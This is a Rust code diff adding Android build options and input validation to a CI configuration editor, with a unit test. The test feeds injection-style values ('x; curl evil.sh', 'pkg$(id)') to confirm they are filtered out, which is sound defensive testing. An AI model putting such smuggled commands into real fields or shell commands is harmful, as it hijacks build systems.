@@ -208,6 +208,15 @@ impl EditorState {
         crate::rules::aur_packages(&self.facts, &self.config)
     }
 
+    /// The Gradle project directory detection found, `.` when there is none
+    fn default_android_dir(&self) -> String {
+        self.facts
+            .android
+            .as_ref()
+            .map(|a| a.dir.clone())
+            .unwrap_or_else(|| ".".to_string())
+    }
+
     /// The config-option rows of one rule, in display order: the toolchain
     /// versions of a test rule, or the image name (plus docker-release's
     /// booleans) of a docker rule. Empty for every other rule, which is also
@@ -254,6 +263,58 @@ impl EditorState {
                     .map(|packages| packages.join(", ")),
                 effective: self.effective_aur_packages().join(", "),
             }];
+        }
+
+        if rule_id == "android-build" {
+            return vec![
+                Row::TextKnob {
+                    rule_id,
+                    label: "dir",
+                    description: "Gradle project directory relative to the repository \
+                                  root; the default is the detected one. Press Enter to \
+                                  edit.",
+                    override_value: self.config.android_build.dir.clone(),
+                    effective: self
+                        .config
+                        .android_build
+                        .dir
+                        .clone()
+                        .unwrap_or_else(|| self.default_android_dir()),
+                },
+                Row::TextKnob {
+                    rule_id,
+                    label: "apt_packages",
+                    description: "Comma-separated Debian packages the native build needs \
+                                  on the host, e.g. \"libasound2-dev, llvm\". Press Enter \
+                                  to edit.",
+                    override_value: self
+                        .config
+                        .android_build
+                        .apt_packages
+                        .as_ref()
+                        .map(|packages| packages.join(", ")),
+                    effective: self
+                        .config
+                        .android_build
+                        .apt_packages
+                        .as_ref()
+                        .map(|packages| packages.join(", "))
+                        .unwrap_or_default(),
+                },
+                Row::TextKnob {
+                    rule_id,
+                    label: "rust_toolchain",
+                    description: "Rust toolchain for the cargo-ndk pre-build: \"stable\", \
+                                  \"nightly\", or \"x.y[.z]\". Press Enter to edit.",
+                    override_value: self.config.android_build.rust_toolchain.clone(),
+                    effective: self
+                        .config
+                        .android_build
+                        .rust_toolchain
+                        .clone()
+                        .unwrap_or_else(|| "stable".to_string()),
+                },
+            ];
         }
 
         if !matches!(rule_id, "docker-build" | "docker-release") {
@@ -407,36 +468,60 @@ impl EditorState {
         };
         let value = buffer.trim().to_string();
         match self.rows.get(self.cursor).cloned() {
-            // The typed names are written to cibox.ron and from there into
+            // The typed values are written to cibox.ron and from there into
             // shell commands, so coerce them into valid values rather than
             // saving something the config parser would reject
-            Some(Row::TextKnob {
-                rule_id: "aur-release",
-                ..
-            }) => {
-                let packages: Vec<String> = value
-                    .split(',')
-                    .map(str::trim)
-                    .filter(|p| !p.is_empty())
-                    .map(crate::config::aur::coerce_package_name)
-                    .collect();
-                // Normalize exactly as rules::resolve would (dedupe), so
-                // what the preview shows is what the file means
-                let packages = clean_versions(Some(&packages));
-                self.config.aur_release.packages = (!packages.is_empty())
-                    .then_some(packages)
-                    .filter(|packages| *packages != self.default_aur_packages());
-            }
-            Some(Row::TextKnob { rule_id, .. }) => {
-                let override_value = (!value.is_empty())
-                    .then(|| crate::config::image::coerce_reference(&value))
-                    .filter(|value| *value != self.default_image());
-                match rule_id {
-                    "docker-build" => self.config.docker_build.image_name = override_value,
-                    "docker-release" => self.config.docker_release.image_name = override_value,
-                    _ => {}
+            Some(Row::TextKnob { rule_id, label, .. }) => match (rule_id, label) {
+                ("aur-release", _) => {
+                    let packages: Vec<String> = value
+                        .split(',')
+                        .map(str::trim)
+                        .filter(|p| !p.is_empty())
+                        .map(crate::config::aur::coerce_package_name)
+                        .collect();
+                    // Normalize exactly as rules::resolve would (dedupe), so
+                    // what the preview shows is what the file means
+                    let packages = clean_versions(Some(&packages));
+                    self.config.aur_release.packages = (!packages.is_empty())
+                        .then_some(packages)
+                        .filter(|packages| *packages != self.default_aur_packages());
                 }
-            }
+                ("docker-build" | "docker-release", _) => {
+                    let override_value = (!value.is_empty())
+                        .then(|| crate::config::image::coerce_reference(&value))
+                        .filter(|value| *value != self.default_image());
+                    match rule_id {
+                        "docker-build" => self.config.docker_build.image_name = override_value,
+                        _ => self.config.docker_release.image_name = override_value,
+                    }
+                }
+                // A path cannot be coerced into a different one that still
+                // exists, so an invalid dir clears the override instead
+                ("android-build", "dir") => {
+                    self.config.android_build.dir = Some(value.clone())
+                        .filter(|v| !v.is_empty())
+                        .filter(|v| crate::config::android::is_valid_project_dir(v))
+                        .filter(|v| *v != self.default_android_dir());
+                }
+                ("android-build", "apt_packages") => {
+                    let packages: Vec<String> = value
+                        .split(',')
+                        .map(|p| p.trim().to_ascii_lowercase())
+                        .filter(|p| crate::config::android::is_valid_apt_package(p))
+                        .collect();
+                    let packages = clean_versions(Some(&packages));
+                    self.config.android_build.apt_packages =
+                        (!packages.is_empty()).then_some(packages);
+                }
+                ("android-build", _) => {
+                    self.config.android_build.rust_toolchain = Some(value.clone())
+                        .filter(|v| !v.is_empty())
+                        .filter(|v| crate::config::android::is_valid_toolchain(v))
+                        // The default; an override saying so is no override
+                        .filter(|v| v != "stable");
+                }
+                _ => {}
+            },
             Some(Row::Version { rule_id, index, .. }) => {
                 let mut versions = self
                     .config
@@ -1049,6 +1134,85 @@ mod tests {
         }
         state.commit_input();
         assert_eq!(state.config.aur_release.packages, None);
+    }
+
+    fn android_dir() -> tempfile::TempDir {
+        let dir = tempdir().unwrap();
+        let gradle = dir.path().join("mobile/android");
+        fs::create_dir_all(gradle.join("app/src/main")).unwrap();
+        fs::write(gradle.join("gradlew"), "").unwrap();
+        fs::write(gradle.join("settings.gradle"), "").unwrap();
+        fs::write(gradle.join("app/src/main/AndroidManifest.xml"), "").unwrap();
+        dir
+    }
+
+    #[test]
+    fn test_android_knob_editing() {
+        let dir = android_dir();
+        let mut state = state_for(dir.path());
+
+        assert!(rule_row(&state, "android-build").enabled);
+        state.cursor = rule_index(&state, "android-build");
+        state.expand_current();
+        let idx = rule_index(&state, "android-build");
+        assert!(matches!(state.rows[idx + 1], Row::TextKnob { label: "dir", .. }));
+        assert!(matches!(
+            state.rows[idx + 2],
+            Row::TextKnob { label: "apt_packages", .. }
+        ));
+        assert!(matches!(
+            state.rows[idx + 3],
+            Row::TextKnob { label: "rust_toolchain", .. }
+        ));
+
+        // The dir prefills with the detected value, and committing it back
+        // stores no override
+        state.cursor = idx + 1;
+        state.activate_current();
+        assert_eq!(state.editing(state.cursor), Some("mobile/android"));
+        state.commit_input();
+        assert_eq!(state.config.android_build.dir, None);
+
+        // An invalid dir clears the override rather than saving something
+        // the config parser would reject
+        state.activate_current();
+        clear_input(&mut state);
+        for c in "x; curl evil.sh".chars() {
+            state.input_push(c);
+        }
+        state.commit_input();
+        assert_eq!(state.config.android_build.dir, None);
+
+        // Typed packages are normalized, filtered, and deduped
+        state.cursor = rule_index(&state, "android-build") + 2;
+        state.activate_current();
+        clear_input(&mut state);
+        for c in "LLVM, libasound2-dev, pkg$(id), llvm,".chars() {
+            state.input_push(c);
+        }
+        state.commit_input();
+        assert_eq!(
+            state.config.android_build.apt_packages,
+            Some(vec!["llvm".to_string(), "libasound2-dev".to_string()])
+        );
+
+        // The toolchain accepts the known shapes and drops the default
+        state.cursor = rule_index(&state, "android-build") + 3;
+        state.activate_current();
+        clear_input(&mut state);
+        for c in "nightly".chars() {
+            state.input_push(c);
+        }
+        state.commit_input();
+        assert_eq!(
+            state.config.android_build.rust_toolchain.as_deref(),
+            Some("nightly")
+        );
+
+        // What the editor saves has to be something it can read back
+        let ron_str = fs::read_to_string(dir.path().join("cibox.ron")).unwrap();
+        crate::config::parse_config(&ron_str).unwrap();
+        assert!(state.yaml_preview.contains("android-build"), "{}", state.yaml_preview);
     }
 
     #[test]
